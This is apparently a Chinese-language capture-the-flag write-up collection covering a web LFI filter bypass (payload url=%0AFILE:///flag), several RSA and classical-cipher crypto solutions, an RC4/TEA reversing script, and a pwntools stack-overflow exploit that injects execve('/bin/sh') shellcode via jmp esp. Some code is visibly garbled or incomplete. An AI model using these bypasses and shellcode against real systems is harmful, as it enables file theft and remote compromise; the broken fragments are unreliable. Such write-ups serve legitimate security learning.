服务对 url 参数做了两层不一致的检查：第一层只检查**第一行**并用不区分大小写的匹配，第二层对**整个输入**再做一次检查但用的是区分大小写的匹配。最终 file\_get\_contents() 使用的是**整个解码后的字符串**，而非仅第一行。这个不一致导致可以用换行符把危险 scheme 放到第二行并用大小写变体绕过第二层，从而触发 LFI，读取服务器本地文件（例如 /flag）。

* 观察第一轮检查只针对第一行，于是想到通过在输入前插入换行符把“真正的”危险 scheme 放到第二行（或后面），从而让 $first 为空或为无害内容，绕过第一轮检查。换行的 URL 编码为 %0A。
* 发现第二轮检测对**整个输入**使用 strpos($decoded, 'file://')（**区分大小写**），因此小写 file:// 会被拦截，但大小写不同的 FILE:// / FiLe:// 等不会被 strpos 命中。
* PHP 的流 wrapper 在解析时通常**不区分大小写**，所以 FILE:///path 能被 file\_get\_contents 识别并读取对应路径。
* 把上面两点结合：先用换行把 FILE:///flag 放到第二行，第一行为空；第一轮检查通过，第二轮大小写敏感检查也不会匹配小写 file://，最终 file\_get\_contents() 读取 FILE:///flag，泄露 /flag。
* 因此构造的有效 payload（URL 编码形式）为：

```
url=%0AFILE:///flag
```

（解码后第一行为空行，第二行为 FILE:///flag）

### 加密流程

* 明文格式：DASCTF{22 个大写字母}。
* 位置移位：遍历明文字符串的每个字符（index 从 0 开始），若为大写字母则向右移 index+1（模 26），其它字符保持不变。
* Beaufort 加密：把上一步结果用 Beaufort 密钥 "DASCTF" 再加密（Beaufort 是 self-inverse）。得到 FLAG\_string。
* 转成整数：m = bytes\_to\_long(FLAG\_string.encode())。
* 生成原始 RSA：p,q 各 512-bit，n = p\*q。
* 构造幂并输出：P = m^p mod n，Q = m^q mod n，N = P\*Q，并泄露 dp = d % (P-1)（其中 d 是对 phi\_N=(P-1)\*(Q-1) 的逆），以及 n, N, dp, e 等值。

### 解密思路

* 题目泄露了关于 N 的 dp，利用 e\*dp - 1 = k\*(P-1) 可枚举 k 求出 P 和 Q 。
* 关键关系：根据费马小定理 ，在模 p 上 m^p ≡ m (mod p) —— 因此 P ≡ m (mod p)；同理 Q ≡ m (mod q)。
* 构造多项式 f(x) = x^2 - (P+Q)x + P\*Q = (x-P)(x-Q)，有 f(m) ≡ 0 (mod n)。
* 若 m 足够小（满足 m < n^{1/2}），Coppersmith（小根）可在模 n 下找出 m（Sage 的 f.small\_roots() 实现）。

**恢复路径（简要）：**

1. 利用 N, dp, e 枚举 k 恢复出 P,Q。
2. 构造 f(x) 并用 Coppersmith 找出 m。
3. m -> bytes -> FLAG\_string，对其做 Beaufort 解密再按位置左移（index+1）恢复原始 FLAG。如果 FLAG\_string 在 m 的字节里丢失 {}，注意按题目格式补回（DASCTF{22 letters}）再执行逆变换。

**第三步：** **解密 Beaufort 密码和自定义移位加密**

**原理：**Beaufort 加密和解密使用相同的算法（密钥为 "DASCTF"）。自定义移位加密是每个字符根据位置（index+1）进行移位，解密时反向操作（减去移位值）。

**python 代码：**

```
from Crypto.Util.number import long_to_bytes
LETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
KEY = 'DASCTF'
def beaufort_encipher_manual(text,key=KEY):
    res=[]
    ki=0
    for ch in text:
        if ch in LETTERS:
            kch=key[ki%len(key)]
            val=(LETTERS.index(kch)-LETTERS.index(ch))%26
            res.append(LETTERS[val])
            ki+=1
        else:
            res.append(ch)
    return ''.join(res)
def beaufort_decipher_manual(text,key=KEY):
    return beaufort_encipher_manual(text,key)
m = 9514860685343171719824272395943916064996685001330076556049297136212
flag_string = long_to_bytes(m).decode()
if len(flag_string)==28:
    flag_string = flag_string[:6]+'{'+flag_string[6:]+'}'
shifted = beaufort_decipher_manual(flag_string,KEY)
recovered=[]
for i,ch in enumerate(shifted):
    if ch in LETTERS:
        orig=LETTERS[(LETTERS.index(ch)-(i+1))%26]
    else:
        orig=ch
    recovered.append(orig)
print('FLAG_string:',flag_string)
```

### 加密流程

* 将 FLAG 转为整数 m = bytes\_to\_long(FLAG)
* 根据明文长度计算 bit\_len，生成两个质数 p, q，要求 (p-1) % e^2 == 0，并且 q 为 p 的下一个质数。
* 构造 N = p \* q
* 计算密文 C = m^e mod N
* 将输出密文作为下一轮明文，重复 25 次

### 解密思路

题目给出的质数生成方式存在规律：

* p 是满足 (p-1) % e^2 == 0 的质数
* q 是 p 的下一个质数

因此每个 N 的 p、q 可通过“平方根附近搜索”的方法恢复（N ≈ p\*q ≈ (sqrt(N))^2）。

因为加密指数 e 很小（19），可以使用 **有限域上多项式求根** 的方式对每个 N 分别尝试找到原文。

总体思路：

1. 读取所有 N、C、e
2. 从最后一轮开始，依次向前回推每轮明文
3. 对每个 N 分别枚举可能的 p, q
4. 在 GF(p), GF(q) 上解方程 x^e ≡ C mod p/q
5. 用中国剩余定理（CRT）组合 p、q 的解
6. 保留符合 bit length 的候选，迭代至最初的明文

```
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <Windows.h>

unsigned char rc4_table[256];

void swap_bytes(unsigned char* a, unsigned char* b) {
    unsigned char tmp = *a;
    *a = *b;
    *b = tmp;
}

// RC4 KSA初始化
void init_rc4_table() {
    char key_str[] = "th0s_i0_ke9";
    for (int i = 0; i < 256; i++)
        rc4_table[i] = i;

    int key_len = strlen(key_str);
    unsigned char temp[256];
    for (int i = 0; i < 256; i++)
        temp[i] = key_str[i % key_len];

    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + rc4_table[i] + temp[i]) & 0xFF;
        swap_bytes(&rc4_table[i], &rc4_table[j]);
    }
}

// RC4 + 偏移反向解密
void rc4_decrypt(unsigned char input[], unsigned char output[], unsigned int length) {
    init_rc4_table();
    unsigned char i = 0, j = 0, k, idx;
    for (unsigned int h = 0; h < length; h++) {
        i = (i + 1) & 0xFF;
        j = (j + rc4_table[i]) & 0xFF;
        swap_bytes(&rc4_table[i], &rc4_table[j]);
        idx = (rc4_table[i] + rc4_table[j]) & 0xFF;
        k = rc4_table[idx] ^ 0x33;
        output[h] = input[h] - k;
    }
}

// TEA 逆运算
void tea_reverse(uint32_t v[2]) {
    uint32_t key[4] = {0x6E982837, 0x44332211, 0x11223344, 0x3728986E};
    uint32_t v0 = v[0], v1 = v[1];
    uint32_t sum = 0xCB9E3951;
    const uint32_t delta = 0x9E3779B8;

    for (int round = 0; round <= 32; round++) {
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) & 3]);
        sum -= delta;
        v0 -= (((v1 << 5) ^ (v1 >> 6)) + v1) ^ (sum + key[sum & 3]);
    }
    v[0] = v0;
    v[1] = v1;
}

int main() {
    unsigned char decrypted[44];
    unsigned char cipher[44] = {
        0x50, 0xD4, 0xC8, 0xC4, 0x8F, 0x84, 0x40, 0xEB, 0x32, 0x81,
        0x8F, 0x85, 0x6C, 0xB2, 0x2B, 0x06, 0xBF, 0x05, 0x35, 0x5D,
        0x2E, 0xE3, 0x7D, 0x46, 0x8D, 0x35, 0x01, 0x70, 0x3A, 0x80,
        0x81, 0xC5, 0xE6, 0x71, 0xD3, 0xD6, 0x50, 0x69, 0x6F, 0xE2,
        0x6E, 0x78, 0x14, 0xD8
    };

    // 逆 TEA（重叠窗口）
    for (int offset = 36; offset >= 0; offset--) {
        tea_reverse((uint32_t*) &cipher[offset]);
    }

    // RC4 逆运算
    rc4_decrypt(cipher, decrypted, 44);

    printf("Decrypted flag: ");
    for (int i = 0; i < 44; i++) {
        printf("%c", decrypted[i]);
    }
    printf("

    return 0;
```

s 是一个 **24 字节** 的栈缓冲区（char s[24]），但是 fgets 被错误地写成 fgets(s, 50, stdin) —— fgets 最多会读 size-1（即 49） 字节并在末尾写 �，显然远超 24 字节，会发生**栈溢出**。

**利用思路（shellcode-on-stack 方法）**：

1. 构造 i386 execve("/bin/sh") shellcode（长度约 24-28 字节）。
2. 把 shellcode 放在输入开头。
3. 用 � 填充至 36 字节。
4. 覆盖 return address 为程序中 jmp esp 的地址。
5. 在被覆盖的返回地址后面放一段短的 stub（例如 sub esp,40; call esp），目的是把 esp 向下调整到 shellcode 开头并 call 进入。
6. 送出 payload，获得 shell。

```
#!/usr/bin/env python3
from pwn import *

context.arch = "i386"
context.log_level = "debug"

elf = ELF("./pwn")
p = elf.process()

shellcode = asm(
    '''
    xor eax,eax
    xor edx,edx
    push edx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx,esp
    xor ecx,ecx
    mov al,0xB
    int 0x80
    '''
)

offset = 36
nop_sled_size = 100

jmp_addrs = list(elf.search(asm('jmp esp')))
jmp = jmp_addrs[0] if jmp_addrs else 0x08048534

nop = b"\x90" * nop_sled_size
body = nop + shellcode
if len(body) > offset:
    avail = max(0, offset - len(shellcode))
    body = b"\x90" * avail + shellcode

payload = body.ljust(offset, b"\x90") + p32(jmp)

log.info(f"using jmp: {hex(jmp)}")
p.sendlineafter(b"me?", payload)
p.interactive()
```
